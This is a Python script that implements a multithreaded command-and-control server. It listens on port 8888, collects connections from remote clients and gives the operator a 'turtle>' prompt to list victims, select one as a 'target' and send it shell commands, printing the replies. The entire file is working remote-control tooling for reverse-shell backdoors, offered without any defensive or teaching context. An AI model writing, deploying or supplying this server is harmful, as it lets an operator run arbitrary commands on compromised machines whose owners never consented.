#!/usr/bin/env python
# -*- coding:utf-8 -*-
# @date: 2018/6/4 上午9:11
# @author: Bill
# @file: multithread_server.py

#!/usr/bin/env python
# coding:utf-8


import socket
import time
import threading
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
all_connections = []
all_addresses = []

# create socket (allows two computers to connect)
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 8888
        s = socket.socket()
    except socket.error as msg:
        print("Create socket error: " + str(msg))


# Bind socket to port and wait for connection from clent
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket Binding error: "+ str(msg) + '\n' + "Retrying...")
        time.sleep(5)
        socket_bind()


# Accept connections from multiple clients and save to list
def accpet_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn,address = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print("\nConnection has been established:" + str(address[0]))
        except:
            print("Error accepting connections")


# Interactive prompt for sending commands remotely
def start_turtle():
    while 1:
        cmd = input('turtle>  ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognized!")


# Displays all current connections
def list_connections():
    results = ''
    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + '   ' + str(all_addresses[i][0]) + '   ' + str(all_addresses[i][0]) + '\n'
    print("-------Clients------" + '\n' + results)


# select a target client
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print("You are now connnected to " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + '>',end="")
        return conn
    except:
        print("Not a valid selection!")
        return None



# Connect with remote target client
def send_target_commands(conn):
    while 1:
        try:
            cmd = input()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480),"utf-8")
                print(client_response,end="")
            if cmd == 'quit':
                break
        except:
            print("Connection was lost")
            break


# create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

# do the next job in the queue(1,handles connection. 2. sends commands)
def work():
    while 1:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accpet_connections()
        if x == 2:
            start_turtle()
        queue.task_done()

# each list item is a new job
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


create_workers()
create_jobs()








